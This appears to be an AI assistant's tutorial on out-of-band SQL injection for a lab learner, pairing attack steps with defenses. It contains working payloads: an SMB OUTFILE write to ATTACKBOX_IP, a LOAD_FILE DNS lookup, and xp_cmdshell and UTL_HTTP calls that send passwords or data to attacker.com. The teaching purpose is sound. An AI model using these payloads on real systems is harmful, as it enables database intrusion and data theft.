# Out of Band SQL Injection

# Out-of-Band (OOB) SQL Injection — Process Flow

## 1️⃣ Vulnerable Input

The attacker finds a parameter vulnerable to SQL injection.

Example vulnerable code:

```php
$sql = "SELECT * FROM visitor WHERE name = '$visitor_name'";
```

User input is inserted **directly into SQL**.

Example request:

```
/search_visitor.php?visitor_name=Tim
```

---

## 2️⃣ Direct SQLi Fails or Is Limited

Sometimes traditional SQLi techniques don't work because:

- Application **does not display query results**
- Output is **filtered or sanitised**
- WAF blocks responses
- Blind SQLi is **too slow**

So the attacker needs another channel.

---

## 3️⃣ Attacker Uses External Communication Channel

Instead of returning results to the web page, the database server sends data **out of the network**.

Common OOB channels:

| Protocol | Purpose |
| --- | --- |
| DNS | data exfiltration |
| HTTP | send request to attacker server |
| SMB | write file to attacker share |
| FTP | upload extracted data |

---

# Typical OOB SQLi Attack Chain

```
Attacker
   │
   │ inject payload
   ▼
Web Application
   │
   ▼
Database Server
   │
   │ executes malicious SQL
   ▼
External Server controlled by attacker
(DNS / HTTP / SMB)
   │
   ▼
Sensitive data received
```

---

# Example: SMB OOB Exfiltration (Your Lab Scenario)

Attacker first creates an SMB share:

```
ATTACKBOX_IP\logs
```

Using **Impacket SMB server**:

```bash
python3 smbserver.py -smb2support logs /tmp
```

Now the database can write files to that share.

---

# Injected Payload

```sql
1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --
```

### What Happens

1️⃣ Original query

```sql
SELECT * FROM visitor WHERE name = 'Tim'
```

---

2️⃣ After injection

```sql
SELECT * FROM visitor WHERE name = '1';

SELECT @@version INTO OUTFILE '\\ATTACKBOX_IP\logs\out.txt';
```

---

3️⃣ Database writes file to attacker SMB share

```
\\ATTACKBOX_IP\logs\out.txt
```

---

4️⃣ Attacker retrieves file

```
/tmp/out.txt
```

Contents:

```
MySQL 8.0.32
```

---

# Why OOB SQLi Is Powerful

### Works when:

- Blind SQLi only
- No response data
- WAF filters results
- Application errors hidden

### Advantages

✔ stealthy

✔ bypasses response filtering

✔ works behind firewalls

✔ allows large data exfiltration

---

# Other OOB Techniques

## DNS Exfiltration

Database triggers DNS lookup.

Example concept:

```
SELECT LOAD_FILE(CONCAT('\\\\',password,'.attacker.com\\test'));
```

DNS request sent:

```
passwordhash.attacker.com
```

Attacker DNS server logs the query.

---

## MSSQL xp_cmdshell

```sql
EXEC xp_cmdshell 'nslookup data.attacker.com'
```

or

```sql
EXEC xp_cmdshell 'curl http://attacker.com/data'
```

---

## Oracle UTL_HTTP

```sql
UTL_HTTP.REQUEST('http://attacker.com/?data='||password);
```

---

# Security Controls That Stop OOB SQLi

Good defenses include:

### Prepared Statements

```php
$stmt = $pdo->prepare("SELECT * FROM visitor WHERE name = ?");
```

---

### Disable Dangerous Features

Examples:

- `xp_cmdshell`
- `LOAD_FILE`
- `UTL_HTTP`
- `SELECT INTO OUTFILE`

---

### Restrict Network Egress

Database server should **not make outbound connections**.

Firewall rules:

```
DB → Internet : BLOCK
```

---

### secure_file_priv

Restricts file writes:

```
secure_file_priv = /var/lib/mysql-files/
```

---

# Real-World Pentesting Tip

When testing SQLi always check for:

```
INTO OUTFILE
LOAD_FILE
xp_cmdshell
UTL_HTTP
```

because they often allow **RCE or OOB exfiltration**.

---

💡 Since you’re practicing **advanced SQLi**, the next concepts you’ll likely run into are:

- **DNS-based SQLi data exfiltration**
- **Time-based blind SQL injection**
- **SQL injection → remote code execution**
- **Second-order SQL injection**

If you want, I can also show you a **real pentester workflow for detecting OOB SQLi using Burp Collaborator / interactsh** — this is what professionals actually use in bug bounties.